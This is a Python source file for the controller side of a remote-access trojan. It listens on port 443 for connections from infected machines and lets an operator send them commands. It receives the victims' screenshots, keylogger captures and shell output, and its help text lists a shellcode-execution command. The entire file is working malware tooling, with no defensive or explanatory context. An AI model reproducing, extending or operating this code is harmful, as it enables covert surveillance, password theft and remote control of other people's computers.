import socket

HOST = '0.0.0.0'  # Use '0.0.0.0' to accept connections from any address
PORT = 443
EOF_MARKER = b'--EOF--'

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}\n")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}\n")

        # Handle client connection in a separate thread or process
        handle_client(client_socket)

def handle_client(client_socket):
    try:
        while True:
            command = input("$: \n")
            if command == '/exit':
                client_socket.send(command.encode('utf-8'))
                break
            elif command == 'help':
                print("usage: -> screenshot\n       -> keylog\n       -> run_shellcode\n")
            elif command == 'screenshot':
                client_socket.send(command.encode('utf-8'))
                with open('received_screenshot.bmp', 'wb') as f:
                    while True:
                        chunk = client_socket.recv(4096)
                        if EOF_MARKER in chunk:
                            f.write(chunk.replace(EOF_MARKER, b''))
                            break
                        f.write(chunk)
                print("Screenshot received and saved as 'received_screenshot.bmp'.\n")
            elif command == 'keylog':
                client_socket.send(command.encode('utf-8'))
                with open('received_keylog.txt', 'w') as f:
                    while True:
                        chunk = client_socket.recv(4096).decode('utf-8', errors='replace')
                        if EOF_MARKER.decode('utf-8') in chunk:
                            f.write(chunk.replace(EOF_MARKER.decode('utf-8'), ''))
                            break
                        f.write(chunk)
                print("Keylog received and saved as 'received_keylog.txt'.\n")
            else:
                client_socket.send(command.encode('utf-8'))
                response = client_socket.recv(4096)
                print(response.decode('utf-8', errors='replace'))
    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        client_socket.close()

if __name__ == '__main__':
    start_server()
